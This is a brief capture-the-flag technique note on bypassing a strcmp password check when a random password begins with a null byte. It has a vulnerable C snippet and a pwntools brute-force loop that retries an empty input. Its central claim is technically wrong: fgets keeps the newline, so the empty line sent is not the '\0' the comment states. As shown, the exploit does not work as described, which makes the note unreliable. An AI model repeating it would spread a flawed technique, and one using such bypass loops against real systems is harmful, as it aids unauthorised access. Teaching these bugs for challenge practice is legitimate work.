# Null Byte strcmp Bypass

**When:** A random binary password is compared with `strcmp`. If the password's first byte is `\0`, an empty input matches.

**How it works:** `strcmp` stops at the first null byte. If `password[0] == '\0'`, then `strcmp("\0", "\0") == 0`. There's a 1/256 chance the random password starts with `\0`.

```c
char password[0x10];
getrandom(password, 0x10, 0);
fgets(input, 0x100, stdin);
if (strcmp(input, password) == 0) grant_access();
```

```python
while True:
    p = process("./chall")
    p.sendlineafter(b":", b"")   # empty input -> "\0" via fgets
    if b"Nope" not in p.recv(timeout=1):  # no rejection = success
        p.interactive()
        break
```
